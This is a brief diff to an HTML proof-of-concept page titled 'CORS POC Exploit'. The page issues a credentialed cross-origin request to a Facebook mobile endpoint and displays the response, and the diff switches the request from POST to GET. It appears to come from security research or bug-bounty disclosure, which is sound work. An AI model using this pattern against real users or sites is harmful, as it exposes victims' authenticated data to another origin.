@@ -1,5 +1,5 @@
 <html>
- <head><link rel="canonical" href="https://facebook.com/sem_pixel/1/test/0"></head>
+ <head><link rel="canonical" href="https://facebook.com"></head>
 <body>
 <center>
 <h2>CORS POC Exploit</h2>
@@ -17,7 +17,7 @@ function cors() {
       document.getElementById("demo").innerHTML = alert(this.responseText);
     }
   };
-  xhttp.open("POST", "https://m.facebook.com/sem_pixel/1/test/300/", true);
+  xhttp.open("GET", "https://m.facebook.com/sem_pixel/1/test/300/", true);
   xhttp.withCredentials = true;
   xhttp.send();
 }
